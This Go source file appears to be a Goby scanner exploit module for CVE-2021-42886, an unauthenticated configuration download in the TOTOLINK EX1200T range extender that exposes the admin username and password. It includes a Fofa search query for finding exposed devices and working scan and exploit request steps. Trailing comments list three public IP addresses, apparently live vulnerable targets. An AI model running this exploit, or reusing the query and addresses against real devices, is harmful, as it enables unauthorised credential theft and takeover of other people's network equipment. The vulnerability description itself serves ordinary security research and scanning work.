package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TOTOLINK EX1200T ExportSettings.sh Information Disclosure (CVE-2021-42886)",
    "Description": "<p>TOTOLINK EX1200T is a Wi-Fi range extender from China TOTOLINK.</p><p>TOTOLINK EX1200T V4.1.2cu.5215 has a security vulnerability, an attacker can use this vulnerability to obtain the apmib configuration file without authorization, and the username and password can be found in the decoded file.</p>",
    "Product": "TOTOLINK EX1200T",
    "Homepage": "http://totolink.net/",
    "DisclosureDate": "2022-06-07",
    "Author": "abszse",
    "FofaQuery": "title=\"TOTOLINK\" || body=\"<script>function getUserBrowser(){var e=navigator.userAgent\"",
    "GobyQuery": "title=\"TOTOLINK\" || body=\"<script>function getUserBrowser(){var e=navigator.userAgent\"",
    "Level": "2",
    "Impact": "<p>TOTOLINK EX1200T V4.1.2cu.5215 has a security vulnerability, an attacker can use this vulnerability to obtain the apmib configuration file without authorization, and the username and password can be found in the decoded file.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem, please pay attention to the official website update: <a href=\"http://totolink.net/.\">http://totolink.net/.</a></p>",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202206-455"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "ExportSettings.sh",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/ExportSettings.sh",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": ".dat\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Password=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/{{{filename}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": ".dat\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2021-42886"
    ],
    "CNNVD": [
        "CNNVD-202206-455"
    ],
    "CNVD": [],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "TOTOLINK EX1200T ExportSettings.sh 信息泄露漏洞 (CVE-2021-42886)",
            "Product": "TOTOLINK EX1200T",
            "Description": "<p>TOTOLINK EX1200T是中国吉翁电子（TOTOLINK）公司的一款 Wi-Fi 范围扩展器。<br></p><p>TOTOLINK EX1200T V4.1.2cu.5215存在安全漏洞，攻击者可以在未经授权的情况下利用该漏洞获取apmib配置文件，在解码后的文件中可以找到用户名和密码。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，请及时关注官网更新：<a href=\"http://totolink.net/\">http://totolink.net/</a>。<br></p>",
            "Impact": "<p>TOTOLINK EX1200T V4.1.2cu.5215存在安全漏洞，攻击者可以在未经授权的情况下利用该漏洞获取apmib配置文件，在解码后的文件中可以找到用户名和密码。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "TOTOLINK EX1200T ExportSettings.sh Information Disclosure (CVE-2021-42886)",
            "Product": "TOTOLINK EX1200T",
            "Description": "<p>TOTOLINK EX1200T is a Wi-Fi range extender from China TOTOLINK.<br></p><p>TOTOLINK EX1200T V4.1.2cu.5215 has a security vulnerability, an attacker can use this vulnerability to obtain the apmib configuration file without authorization, and the username and password can be found in the decoded file.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem, please pay attention to the official website update: <a href=\"http://totolink.net/.\">http://totolink.net/.</a><br></p>",
            "Impact": "<p>TOTOLINK EX1200T V4.1.2cu.5215 has a security vulnerability, an attacker can use this vulnerability to obtain the apmib configuration file without authorization, and the username and password can be found in the decoded file.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
//http://113.53.192.75:8444
//http://125.24.169.145:1234
//http://220.137.32.176:8080